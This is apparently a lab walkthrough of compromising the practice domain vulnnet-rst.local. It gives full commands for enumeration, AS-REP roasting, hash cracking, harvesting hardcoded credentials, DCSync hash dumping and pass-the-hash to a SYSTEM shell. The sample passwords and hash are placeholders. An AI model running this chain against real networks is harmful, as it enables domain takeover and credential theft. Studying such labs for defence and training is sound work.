1. Reconnaissance (Port Scanning)
We start by scanning all ports to see what services are running. A Domain Controller typically has many open ports: DNS, Kerberos, LDAP, SMB, etc.

nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -Pn -oN all-ports-nmap-report <TARGET_IP>

Explanation of options:

-T5 – fastest timing (aggressive)
--open – show only open ports
-sS – SYN scan (stealth)
-vvv – very verbose output
--min-rate=300 – send at least 300 packets per second
--max-retries=3 – limit retries to save time
-p- – scan all 65535 ports
-Pn – skip host discovery (treat host as up)
-oN – save output in normal format
Result: Many open ports. Most important for us:
53/tcp (DNS)
88/tcp (Kerberos)
389/tcp (LDAP)
445/tcp (SMB)
5985/tcp (WinRM – Windows Remote Management)

Now we do a detailed scan on those ports to get service versions and default scripts:
nmap -sV -sC -Pn -v -oN nmap-report -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 <TARGET_IP>

Result: The domain name is revealed: vulnnet-rst.local.

Add it to your /etc/hosts file so tools can resolve it:

echo "<TARGET_IP> vulnnet-rst.local" | sudo tee -a /etc/hosts

2. SMB Enumeration (Anonymous Shares)
SMB (Server Message Block) is a file-sharing protocol. Sometimes administrators leave shares open for anonymous access.

First, list all available shares without a password:

smbclient -L //<TARGET_IP>/ -N

-L – list shares
-N – no password (anonymous)

Result: Several shares appear. Two of them allow read access for anonymous users:

VulnNet-Business-Anonymous
VulnNet-Enterprise-Anonymous

Let's confirm with CrackMapExec (a popular post‑exploitation tool):
crackmapexec smb <TARGET_IP> -u guest -p "" --shares

-u guest -p "" – use guest account with empty password
--shares – enumerate shares

Now connect to each anonymous share and download all files:
smbclient //<TARGET_IP>/VulnNet-Business-Anonymous -N
> prompt   # turn off interactive confirmation
> mget *   # download all files
> exit

Repeat for the other share.

What we find: Several .txt files containing usernames:

t-skid
a-whitehat
enterprise-core-vn
enterprise-super
These are potential domain users.

3. User Enumeration (RID Brute Force & Kerbrute)
We have four usernames, but there might be more. We can perform a RID brute force attack using impacket-lookupsid. RID stands for Relative Identifier – each user has a numeric ID. By guessing RIDs we can discover all users.

impacket-lookupsid vulnnet-rst.local/guest@<TARGET_IP> -no-pass

This uses the IPC$ share and the guest account (empty password).
It iterates through possible RIDs and returns usernames.

Result: The same four usernames appear, confirming they exist.

To be extra sure, we use Kerbrute – a tool for enumerating users via Kerberos pre‑authentication:
kerbrute userenum -d vulnnet-rst.local --dc <TARGET_IP> usernames.txt

usernames.txt is a file containing the four names (one per line).
All four are valid domain users.

4. AS-REP Roasting Attack
What is AS-REP Roasting?
Kerberos authentication normally requires pre‑authentication: the client sends a timestamp encrypted with their password hash. If the user has the flag DONT_REQ_PREAUTH set, the Domain Controller will return an AS-REP message containing the user’s encrypted session key. This encrypted data can be cracked offline. It’s called AS-REP Roasting.

We can test which users have this misconfiguration using impacket-GetNPUsers:
impacket-GetNPUsers vulnnet-rst.local/ -dc-ip <TARGET_IP> -no-pass -usersfile usernames.txt -request -format john -outputfile asrep.hash

-no-pass – we don’t have a password yet
-usersfile – list of usernames to test
-request – request the AS-REP
-format john – format for John the Ripper
-outputfile – save hashes

Result:
We get a hash for user t-skid – meaning this user has pre‑authentication disabled.

5. Cracking the AS-REP Hash
Now we crack the hash using a wordlist. rockyou.txt is a famous password list.

Using John the Ripper:
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash

Or Hashcat (mode 18200 for AS-REP hashes):
hashcat -a 0 -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

Cracked password: Password (or a common word; for this room, it’s something like Password – the exact one appears in rockyou).

Thus we have:
t-skid:Password

6. Finding More Credentials in NETLOGON Share
Now that we have a valid domain user (t-skid), we can access more SMB shares, including the NETLOGON share. This share often contains login scripts and configuration files – sometimes with hardcoded credentials.

smbclient //vulnnet-rst.local/NETLOGON/ -U 't-skid'
Enter the password we cracked.
ls
We see ResetPassword.vbs. Download it:
get ResetPassword.vbs

Examine the file:
' ResetPassword.vbs
strUsername = "a-whitehat"
strPassword = "MyP@ssw0rd!"   ' This is an example; actual password is different
Result: The script contains plaintext credentials for user a-whitehat.
Now we have:
a-whitehat:MyP@ssw0rd! (replace with actual discovered password)

7. Privilege Escalation (Domain Admin)
We check the group membership of a-whitehat using CrackMapExec:
crackmapexec smb <TARGET_IP> -u 'a-whitehat' -p 'MyP@ssw0rd!'

It will show the groups.
Result: a-whitehat is a member of the Domain Admins group – that means full control over the entire domain.

Because WinRM (port 5985) is open, we can get a remote shell using evil-winrm:
evil-winrm -i <TARGET_IP> -u 'a-whitehat' -p 'MyP@ssw0rd!'
Now we have a PowerShell session on the Domain Controller.

8. Dumping All Hashes (DCSync)
As a Domain Admin, we can perform a DCSync attack – this tricks the Domain Controller into giving us all password hashes (including the Administrator account). We don’t need to do it from the shell; we can use impacket-secretsdump from our local machine:
impacket-secretsdump vulnnet-rst.local/a-whitehat:'MyP@ssw0rd!'@<TARGET_IP>
Result: A long list of hashes. Look for the line containing Administrator. Example:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a6a6f1a5b5b1c2d3e4f5a6b7c8d9e:::

The second long hex string (after the second colon) is the NTLM hash of the Administrator.

9. Pass-the-Hash to Administrator
With the NTLM hash, we can authenticate as Administrator without knowing the plaintext password. This is Pass-the-Hash (PtH). We use impacket-psexec or wmiexec:
impacket-psexec vulnnet-rst.local/administrator@<TARGET_IP> -hashes <NTLM_hash>
Replace <NTLM_hash> with the hash we dumped (just the second part, e.g., cf3a6a6f...).
We can also use impacket-wmiexec if psexec fails.

Now we have a SYSTEM shell as the Administrator.

